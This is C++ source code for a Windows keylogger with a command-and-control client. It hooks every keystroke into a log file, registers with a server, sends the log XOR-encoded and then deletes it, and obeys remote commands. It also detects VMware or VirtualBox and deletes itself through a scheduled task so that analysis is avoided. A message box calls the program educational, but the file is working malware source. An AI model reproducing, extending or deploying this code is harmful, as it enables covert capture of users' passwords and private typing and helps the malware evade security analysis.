#include <winsock2.h>
#include <windows.h>

#include <iostream>
#include <fstream>
#include <sstream>
#include <winuser.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <ws2tcpip.h>
#include <tchar.h>
#include <thread>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

using namespace std;

bool active = true;
string DeviceID;
SOCKET sock = INVALID_SOCKET;

// Converts key int to string
string KeyToString(int key) {
    switch (key) {
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return "[SPACE]";
        case VK_TAB: return "[TAB]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_LSHIFT: return "[L_SHIFT]";
        case VK_RSHIFT: return "[R_SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_LCONTROL: return "[L_CTRL]";
        case VK_RCONTROL: return "[R_CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_LMENU: return "[L_ALT]";
        case VK_RMENU: return "[R_ALT]";
        case VK_CAPITAL: return "[CAPS LOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_PRIOR: return "[PAGE UP]";
        case VK_NEXT: return "[PAGE DOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT_ARROW]";
        case VK_UP: return "[UP_ARROW]";
        case VK_RIGHT: return "[RIGHT_ARROW]";
        case VK_DOWN: return "[DOWN_ARROW]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_PRINT: return "[PRINT_SCREEN]";
        case VK_PAUSE: return "[PAUSE]";
        case VK_PLAY: return "[PLAY]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default: return string(1, static_cast<char>(key));
    }
}

// Log keystrokes to file
void LogKeystroke(int key) {
    ofstream logfile("keylog.txt", ios_base::app);
    if (logfile.is_open()) {
        logfile << KeyToString(key);
        logfile.close();
    } else {
        cerr << "Failed to open keylog file for writing." << endl;
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        LogKeystroke(kbdStruct->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Display a message to the user
void DisplayMessage() {
    MessageBoxW(NULL, L"Sorry, you've been pwned, for educational purposes!", L"Pwned!", MB_OK | MB_ICONEXCLAMATION);
}

// Handle false command response
void FalseCommandResponse(const string& message) {
    cout << "False Command: " << message << endl;
}

// Follow commands received from server
void FollowCommand(const string& command) {
    cout<<command<<endl;
    stringstream commandStream(command);
    vector<string> commandSegments;
    string segment;

    while (getline(commandStream, segment, ' ')) {
        commandSegments.push_back(segment);
    }

    if (commandSegments.size() < 2 || commandSegments.size() > 3) {
        FalseCommandResponse("Invalid command format.");
        return;
    }

    string cmd = commandSegments[0];
    string id = commandSegments[1];

    if (cmd == "slp") {
        int n = 5; // Default sleep time
        if (commandSegments.size() == 3) {
            size_t pos;
            n = stoi(commandSegments[2], &pos);
            if (pos != commandSegments[2].size()) {
                FalseCommandResponse("Invalid sleep length.");
                return;
            }
        }
        Sleep(n * 1000); // Convert seconds to milliseconds
    } else if (cmd == "shd") {
        exit(0);
    } else if (cmd == "pwn") {
        DisplayMessage();
    } else {
        FalseCommandResponse("Unknown command.");
    }
}

// Connect to the server
bool connectToServer() {
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        cerr << "WSAStartup failed with error: " << iResult << endl;
        return false;
    }

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port (localhost)
    iResult = getaddrinfo("127.0.0.1", "8888", &hints, &result);
    if (iResult != 0) {
        cerr << "getaddrinfo failed with error: " << iResult << endl;
        WSACleanup();
        return false;
    }

    // Attempt to connect to an address until one succeeds
    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        // Create a SOCKET for connecting to server
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            cerr << "socket failed with error: " << WSAGetLastError() << endl;
            WSACleanup();
            return false;
        }

        // Connect to server
        iResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            cerr << "connect failed with error: " << WSAGetLastError() << endl;
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (sock == INVALID_SOCKET) {
        cerr << "Unable to connect to server!" << endl;
        WSACleanup();
        return false;
    }

    cout << "Connected to server successfully!" << endl;

    // Send registration request to the server
    string httpRequest = "GET /newClient?id=" + DeviceID + " HTTP/1.1\r\nHost: localhost\r\n\r\n";
    iResult = send(sock, httpRequest.c_str(), static_cast<int>(httpRequest.length()), 0);
    if (iResult == SOCKET_ERROR) {
        cerr << "send failed with error: " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return false;
    }

    return true;
}

string encode(const string& message) {
    char key = '1';
    string encodedMessage = message;
    for (char& c : encodedMessage) {
        char temp = c;
        c = c ^ key;
        key = (key << 1) | (key >> 7);
    }
    return encodedMessage;
}

// Send message over socket
bool sendMessage(const string& message) {
    if (message.size()<100){
        return false;
    }
    string codedMessage = encode(message);
    int iResult = send(sock, codedMessage.c_str(), static_cast<int>(message.length()), 0);
    if (iResult == SOCKET_ERROR) {
        cerr << "send failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return false;
    }
    return true;
}
string readLogFile(){
    ifstream logfile;
    logfile.open("keylog.txt", ios_base::app);
    
    if (!logfile.is_open()) {
        cerr << "Failed to open keylog file for reading." << endl;
        return "";
    }

    // Determine the file size
    logfile.seekg(0, ios::end);
    int fileSize = logfile.tellg();
    logfile.seekg(0, ios::beg);

    // Allocate a buffer for file contents
    char* buffer = new char[fileSize];
    logfile.read(buffer, fileSize);
    logfile.close();
    
    return buffer;
}
// Delete keylog file
void deleteLog() {
    if (remove("keylog.txt") != 0) {
        cerr << "Failed to delete keylog file." << endl;
    }
}

// Send log file and delete it
void deleteAndSendLog() {
    if (sock == INVALID_SOCKET) {
        cerr << "Failed to connect to server." << endl;
        return;
    }
    if (sendMessage(readLogFile())) {
        deleteLog();
    }
}

//check if exe us being run inside a virtual machine
bool isInsideVM(){
HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_15AD&DEV_0405&SUBSYS_040515AD&REV_00"), 0, KEY_READ, &hKey);

    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true; // Detected VMware
    }

    result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_80EE&DEV_CAFE"), 0, KEY_READ, &hKey);

    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true; // Detected VirtualBox
    }

    return false;
}

//delete the currently running exe
void selfDestruct() {
    TCHAR szFileName[MAX_PATH];
    TCHAR szCmd[MAX_PATH];
    TCHAR szTempPath[MAX_PATH];
    TCHAR szTaskName[MAX_PATH] = _T("SelfDeleteTask");

    // Get the file name of the executable
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    // Get the temp path
    GetTempPath(MAX_PATH, szTempPath);

    // Prepare the command to create a scheduled task that deletes the executable
    _stprintf_s(szCmd, MAX_PATH, _T("schtasks /create /tn \"%s\" /tr \"cmd.exe /c del /f /q \\\"%s\\\"\" /sc once /st 00:00 /sd 01/01/2000 /f"), szTaskName, szFileName);

    // Execute the command to create the scheduled task
    _tsystem(szCmd);

    // Prepare the command to run the scheduled task
    _stprintf_s(szCmd, MAX_PATH, _T("schtasks /run /tn \"%s\""), szTaskName);

    // Execute the command to run the scheduled task
    _tsystem(szCmd);

    // Optionally, you can add a command to delete the scheduled task itself after execution
    //_stprintf_s(szCmd, MAX_PATH, _T("schtasks /delete /tn \"%s\" /f"), szTaskName);

    // Execute the command to delete the scheduled task
    _tsystem(szCmd);
}

void commandHandelingThread(){
    while (active) {
        char response[4096];
        int bytesRead = recv(sock, response, sizeof(response) - 1, 0);
        if (bytesRead > 0) {
            response[bytesRead] = '\0';
            cout<<"hi :"<<response<<endl;
            FollowCommand(response); // Handle server commands
        }
    }
}

// Main function
int main() {
    //delete exe if inside a vm so it cant ve analysed
    
    if (isInsideVM()){
        selfDestruct();
    }
    // Set the keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        cerr << "Failed to set hook. Error code: " << GetLastError() << endl;
        return 1;
    }

    srand(static_cast<unsigned int>(time(nullptr)));
    int id = rand();
    DeviceID = "Device-" + to_string(id);

    if (!connectToServer()) {
        cerr << "Failed to connect to server." << endl;
        return 1;
    }

    thread commandThread(commandHandelingThread);

    int i = 0;
    MSG msg;
    while (active) {
        i += 1;
        if (i == 1000000) {
            i = 0;
            deleteAndSendLog();
        }

        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
        }
    }

    // Cleanup
    active = false;
    commandThread.join();
    closesocket(sock);
    WSACleanup();
    return 0;
}
